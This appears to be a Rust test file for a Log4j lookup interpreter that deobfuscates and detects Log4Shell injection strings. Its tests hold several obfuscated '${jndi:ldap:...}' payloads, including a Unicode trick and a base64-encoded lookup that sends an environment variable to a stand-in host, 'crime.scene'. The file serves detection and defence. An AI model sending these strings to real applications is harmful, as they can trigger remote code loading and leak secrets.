use log4j_interpreter::{parse_str, Findings};

fn parseu(input: &str) -> (String, Findings) {
    parse_str(input, 3).unwrap()
}

fn parseu_string(input: &str) -> String {
    parse_str(input, 3).unwrap().0
}

#[test]
fn partial_escape() {
    assert_eq!("hi$$there", parseu_string("hi$$there"));
}
#[test]
fn full_escape() {
    assert_eq!("hi${there", parseu_string("hi$${there"));
}
#[test]
fn partial_substitute() {
    assert_eq!("hi${lower:X", parseu_string("hi${lower:X"));
}
#[test]
fn full_substitute() {
    assert_eq!("hixthere", parseu_string("hi${lower:X}there"));
}
#[test]
fn nested_substitute() {
    assert_eq!("hiTHERE", parseu_string("hi${upper:th${lower:ERE}}"));
}
#[test]
fn obfuscated() {
    let input = "${\
        ${uPBeLd:JghU:kyH:C:TURit:-j}\
        ${odX:t:STGD:UaqOvq:wANmU:-n}\
        ${mgSejH:tpr:zWlb:-d}\
        ${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}\
        ${fGX:L:KhSyJ:-:}\
        ${E:o:wsyhug:LGVMcx:-l}\
        ${Prz:-d}\
        ${d:PeH:OmFo:GId:-a}\
        ${NLsTHo:-p}\
        ${uwF:eszIV:QSvP:-:}\
        ${JF:l:U:-/}\
        ${AyEC:rOLocm:-/}\
    }";
    let (result, findings) = parseu(input);
    assert_eq!("jndi:ldap://", result);
    assert!(findings.saw_jndi);
}
#[test]
fn unicode_obfuscated() {
    let (result, findings) =
        parseu("does this get blocked? ${jnd${lower:${upper:ı}}:ldap://whatever}");
    assert_eq!(
        "does this get blocked? jndi:ldap://whatever",
        // note: the next line intentionally uses a unicode character
        result,
    );
    assert!(findings.saw_jndi);
}
#[test]
fn default_dollar() {
    assert_eq!("$", parseu_string("${::-$}"));
}
#[test]
fn complex_default_dollar() {
    assert_eq!("$hello", parseu_string("${::-$hello}"));
}
#[test]
fn obfuscated_dollar() {
    assert_eq!(
        "hello jndi:",
        parseu_string("hello ${lower:${::-$}{jndi:}}")
    )
}
#[test]
fn obfuscate_everything() {
    let input = "${::-${::-$}{::}${::--}${::-hi}}";
    assert_eq!("hi", parseu_string(input));
}
#[test]
fn what_does_this_do() {
    let input = "what's that ${::-$}{${::-j}ndi:${::-l}dap:}";
    assert_eq!("what's that jndi:ldap:", parseu_string(input));
}
#[test]
fn base64() {
    let evil = base64::encode("${jndi:ldap:${env:user}.crime.scene/a}");
    let input = format!("all your base64 are ${{base64:{}}}", evil);
    let (result, findings) = parseu(&input);
    assert_eq!(
        "all your base64 are jndi:ldap:env:user.crime.scene/a",
        result
    );
    assert!(findings.saw_jndi);
    assert!(findings.saw_env);

    let harmless = base64::encode("completely harmless text");
    let input = format!("this is ${{base64:{}}}", harmless);
    assert_eq!("this is completely harmless text", parseu_string(&input));
}
#[test]
fn two_default_delimiters() {
    let input = "${::-:-}";
    assert_eq!(":-", parseu_string(input));
}
#[test]
fn much_nesting() {
    let input = "${::-h${::-e${::-l${::-l${::-o ${base64:YWRhbQ==}}}}}}";
    assert_eq!("hello adam", parse_str(input, 6).unwrap().0);
}
